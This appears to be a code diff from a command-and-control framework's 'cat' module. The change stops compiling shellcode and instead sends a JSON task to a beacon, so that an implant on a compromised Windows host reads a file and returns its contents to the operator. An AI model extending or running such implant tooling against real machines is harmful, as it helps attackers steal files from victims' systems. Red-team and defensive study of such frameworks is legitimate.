@@ -2,11 +2,13 @@
 # Display the contents of a file
 #
 
+import json
 import argparse
 
 from lib import buildtools
 
-EXEC_ID = 0x3000
+EXEC_ID   = 0x4000
+OPCODE_LS = 0x2000
 
 ERROR = False
 error_list = ""
@@ -21,10 +23,12 @@ def exit(status=0, message=None):
     if message != None: print(message)
     return
 
-def main(shad0w, args):
+def cat_callback(shad0w, data):
+    print(data)
 
-    # save the raw args
-    raw_args = args
+    return ""
+
+def main(shad0w, args):
     
     # check we actually have a beacon
     if shad0w.current_beacon is None:
@@ -68,19 +72,10 @@ cat C:\\Users\\thejoker\\Desktop\\evil_plans.txt
     # clean it up
     read_file = ' '.join(args.file).replace('\\', "\\\\").replace('"', '')
 
-    # clone all the source files
-    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/cat/", builddir="/root/shad0w/modules/windows/cat/build")
-
-    # set the correct settings
-    template = "LPCSTR szFile = \"%s\";" % (read_file)
-
-    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/cat/build/settings.h")
-
-    # compile the module
-    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/cat/build", modlocation="/root/shad0w/modules/windows/cat/module.exe")
-
-    # get the shellcode from the module
-    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/cat/module.exe", want_base64=True)
+    # make the json
+    data = {"op" : OPCODE_LS, "args": read_file}
+    data = json.dumps(data)
 
     # set a task for the current beacon to do
-    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
+    shad0w.beacons[shad0w.current_beacon]["callback"] = cat_callback
+    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)
